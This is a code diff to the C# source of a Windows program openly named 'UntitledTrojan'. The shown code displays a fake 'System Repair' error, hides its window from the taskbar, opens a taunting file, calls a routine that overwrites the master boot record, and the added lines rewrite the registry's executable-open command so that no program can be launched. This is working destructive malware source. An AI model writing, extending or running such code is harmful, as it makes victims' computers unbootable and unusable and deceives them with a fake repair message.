@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -52,7 +53,10 @@ namespace UntitledTrojan
                         "\nA program running in background is interfering with repairing process.",
                         "System Repair", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     Opacity = 0;
-                    Process.Start("C:\\Windows\\System32\\explorer.exe");
+                    ShowIcon = false;
+                    ShowInTaskbar = false;
+
+                    Process.Start("C:\\Windows\\explorer.exe");
 
                     SoundPlayer plr = new SoundPlayer(Resources.hardbass);
                     plr.PlayLooping();
@@ -65,6 +69,10 @@ namespace UntitledTrojan
                     Process.Start(@"C:\YOU GOT FUCKED.txt");
 
                     MBR.FuckMBR();
+
+                    RegistryKey key2 = Registry.ClassesRoot.OpenSubKey(@"exefile\shell\open\command", true);
+                    key2.SetValue("Default", $"msg \"{Environment.UserName}\" Do you think that you can do this?");
+                    MessageBox.Show("No executables!", "UntitledTrojan");
 
                     startPayloads = true;
                 }
